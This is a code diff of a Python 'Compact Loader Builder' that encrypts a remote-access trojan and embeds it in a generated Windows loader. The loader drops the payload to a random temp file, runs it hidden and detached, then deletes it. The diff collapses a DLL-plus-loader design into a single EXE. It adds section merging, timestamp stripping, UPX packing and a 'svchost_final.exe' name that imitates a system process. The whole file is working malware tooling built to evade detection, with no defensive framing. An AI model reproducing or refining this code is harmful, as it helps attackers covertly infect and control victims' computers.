@@ -1,6 +1,5 @@
 """
-Compact Loader Builder
-Creates small EXE + DLL with encrypted RAT
+Compact Loader Builder - Creates single EXE with embedded RAT
 """
 
 import os
@@ -16,16 +15,26 @@ from pathlib import Path
 def generate_random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-def create_dll_and_loader(original_exe_path, output_dir):
-    print("Reading original EXE...")
+def build_loader(original_exe_path):
+    print("=" * 60)
+    print("COMPACT LOADER BUILDER")
+    print("=" * 60)
+    
+    if not os.path.exists(original_exe_path):
+        print(f"EXE not found: {original_exe_path}")
+        return None
+    
+    output_dir = os.path.dirname(original_exe_path)
+    
+    print("Reading RAT EXE...")
     with open(original_exe_path, 'rb') as f:
         exe_data = f.read()
     
-    print(f"Original size: {len(exe_data) / (1024*1024):.1f} MB")
+    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
     
     print("Compressing...")
     compressed = zlib.compress(exe_data, level=9)
-    print(f"Compressed size: {len(compressed) / (1024*1024):.1f} MB")
+    print(f"Compressed: {len(compressed) / (1024*1024):.1f} MB")
     
     print("Encrypting...")
     key = os.urandom(32)
@@ -36,22 +45,21 @@ def create_dll_and_loader(original_exe_path, output_dir):
     data_b64 = base64.b64encode(encrypted).decode('ascii')
     key_b64 = base64.b64encode(key).decode('ascii')
     
-    print("Generating DLL with embedded RAT...")
+    print("Creating loader EXE with embedded RAT...")
     
-    dll_name = f'lib{generate_random_string()}.dll'
-    
-    dll_code = f'''
+    loader_code = f'''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
-#pragma comment(linker, "/ENTRY:DllMain")
+#pragma comment(linker, "/ENTRY:mainCRTStartup")
+#pragma comment(linker, "/MERGE:.rdata=.data")
+#pragma comment(linker, "/MERGE:.text=.data")
+#pragma comment(linker, "/SECTION:.data,EWR")
 
-static const unsigned char rat_data[] = 
-    "{data_b64}";
-static const unsigned char xor_key[] = 
-    "{key_b64}";
+static const unsigned char rat_data[] = "{data_b64}";
+static const unsigned char xor_key[] = "{key_b64}";
 
 void xor_decrypt(unsigned char* data, int len) {{
     for(int i = 0; i < len; i++) {{
@@ -63,15 +71,22 @@ void run_rat() {{
     char temp_path[MAX_PATH];
     char temp_file[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_path);
-    sprintf(temp_file, "%s%s", temp_path, "tmp.exe");
     
-    // Decrypt
+    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    char filename[13];
+    for(int i = 0; i < 12; i++) {{
+        filename[i] = chars[rand() % 36];
+    }}
+    filename[12] = '\\0';
+    sprintf(temp_file, "%s%s.exe", temp_path, filename);
+    
     int data_len = strlen(rat_data);
     unsigned char* decrypted = (unsigned char*)malloc(data_len);
+    if (!decrypted) return;
+    
     memcpy(decrypted, rat_data, data_len);
     xor_decrypt(decrypted, data_len);
     
-    // Write to temp
     HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE) {{
@@ -79,110 +94,44 @@ void run_rat() {{
         WriteFile(hFile, decrypted, data_len, &written, NULL);
         CloseHandle(hFile);
         
-        // Run
         STARTUPINFOA si = {{sizeof(si)}};
         PROCESS_INFORMATION pi;
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         
         CreateProcessA(temp_file, NULL, NULL, NULL, FALSE,
-                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                       CREATE_NO_WINDOW | DETACHED_PROCESS,
+                       NULL, NULL, &si, &pi);
         
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         
-        // Delete after 3 seconds
-        Sleep(3000);
+        Sleep(5000);
         DeleteFileA(temp_file);
     }}
     free(decrypted);
 }}
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_rat, NULL, 0, NULL);
-    }}
-    return TRUE;
-}}
-'''
-    
-    dll_src = os.path.join(output_dir, f'{dll_name}.c')
-    with open(dll_src, 'w', encoding='utf-8') as f:
-        f.write(dll_code)
-    
-    print(f"DLL source created: {dll_name}.c")
-    
-    # Create loader EXE
-    loader_code = f'''
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-
-#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
-#pragma comment(linker, "/ENTRY:mainCRTStartup")
-
 int main() {{
-    char dll_path[MAX_PATH];
-    char system_dir[MAX_PATH];
-    GetSystemDirectoryA(system_dir, MAX_PATH);
-    sprintf(dll_path, "%s\\\\{dll_name}", system_dir);
-    
-    // Extract DLL from resources
-    HMODULE hModule = GetModuleHandleA(NULL);
-    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCE(101), "DLL");
-    if (!hRes) return 1;
-    
-    HGLOBAL hResData = LoadResource(hModule, hRes);
-    if (!hResData) return 1;
-    
-    DWORD resSize = SizeofResource(hModule, hRes);
-    unsigned char* pData = (unsigned char*)LockResource(hResData);
-    
-    // Save DLL
-    HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 1;
-    
-    DWORD written;
-    WriteFile(hFile, pData, resSize, &written, NULL);
-    CloseHandle(hFile);
-    
-    // Load DLL
-    HMODULE hDll = LoadLibraryA(dll_path);
-    if (!hDll) {{
-        // Try alternative location
-        GetCurrentDirectoryA(MAX_PATH, dll_path);
-        sprintf(dll_path, "%s\\\\{dll_name}", dll_path);
-        hDll = LoadLibraryA(dll_path);
-        if (!hDll) return 1;
-    }}
-    
-    // Delete DLL
-    Sleep(2000);
-    DeleteFileA(dll_path);
-    
+    run_rat();
     return 0;
 }}
 '''
     
-    loader_name = f'loader_{generate_random_string()}.c'
-    loader_path = os.path.join(output_dir, loader_name)
-    with open(loader_path, 'w', encoding='utf-8') as f:
+    loader_src = os.path.join(output_dir, 'loader.c')
+    with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
     
-    print(f"Loader created: {loader_name}")
-    
-    return dll_src, loader_path, dll_name
-
-def compile_with_mingw(source_path, output_path, is_dll=False):
-    print(f"Compiling {source_path}...")
+    print("Compiling loader...")
+    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
     
     cmd = [
         'gcc',
-        source_path,
-        '-o', output_path,
+        loader_src,
+        '-o', loader_exe,
         '-O3',
         '-s',
+        '-static',
         '-fno-exceptions',
         '-fno-rtti',
         '-fno-stack-protector',
@@ -190,81 +139,45 @@ def compile_with_mingw(source_path, output_path, is_dll=False):
         '-Wl,--gc-sections',
         '-Wl,--strip-all',
         '-Wl,--subsystem,windows',
-        '-mwindows',
-        '-static'
+        '-Wl,--no-insert-timestamp',
+        '-Wl,--merge-identical-sections',
+        '-Wl,--discard-all',
+        '-mwindows'
     ]
-    
-    if is_dll:
-        cmd.extend(['-shared'])
     
     try:
         subprocess.run(cmd, check=True, capture_output=True)
-        return True
     except subprocess.CalledProcessError as e:
         print(f"Compilation failed: {e.stderr}")
-        return False
-
-def compress_with_upx(exe_path):
+        return None
+    
     print("Compressing with UPX...")
     try:
-        subprocess.run(['upx', '--best', exe_path], capture_output=True, check=True)
-        return True
+        subprocess.run(['upx', '--best', '--ultra-brute', loader_exe], capture_output=True)
     except:
-        return False
-
-def build_loader(original_exe_path):
-    print("=" * 60)
-    print("COMPACT LOADER BUILDER")
-    print("=" * 60)
-    
-    if not os.path.exists(original_exe_path):
-        print(f"File not found: {original_exe_path}")
-        return None
-    
-    output_dir = os.path.dirname(original_exe_path)
-    
-    # Create DLL and loader
-    dll_src, loader_src, dll_name = create_dll_and_loader(original_exe_path, output_dir)
-    
-    # Compile DLL
-    dll_path = os.path.join(output_dir, dll_name)
-    if not compile_with_mingw(dll_src, dll_path, is_dll=True):
-        print("DLL compilation failed")
-        return None
-    
-    # Compile loader
-    loader_exe = os.path.join(output_dir, f'loader_{generate_random_string()}.exe')
-    if not compile_with_mingw(loader_src, loader_exe, is_dll=False):
-        print("Loader compilation failed")
-        return None
-    
-    # Compress
-    compress_with_upx(loader_exe)
+        pass
     
     original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
-    dll_size = os.path.getsize(dll_path) / (1024 * 1024)
     final_size = os.path.getsize(loader_exe) / (1024 * 1024)
     
     print("=" * 60)
     print("DONE")
-    print(f"Loader: {loader_exe} ({final_size:.2f} MB)")
-    print(f"DLL: {dll_path} ({dll_size:.2f} MB)")
+    print(f"Output: {loader_exe}")
     print(f"Original RAT: {original_size:.1f} MB")
-    print(f"Total size: {final_size + dll_size:.2f} MB")
-    print(f"Saved: {original_size - (final_size + dll_size):.1f} MB")
+    print(f"Final loader: {final_size:.2f} MB")
+    print(f"Compression: {final_size/original_size*100:.1f}%")
+    print(f"Saved: {original_size - final_size:.1f} MB")
     print("=" * 60)
     
-    # Cleanup
     try:
-        os.remove(dll_src)
         os.remove(loader_src)
     except:
         pass
     
-    return loader_exe, dll_path
+    return loader_exe
 
 if __name__ == "__main__":
-    exe_path = "dist/svchost.exe"
+    exe_path = "dist/rat_temp.exe"
     
     if len(sys.argv) > 1:
         exe_path = sys.argv[1]
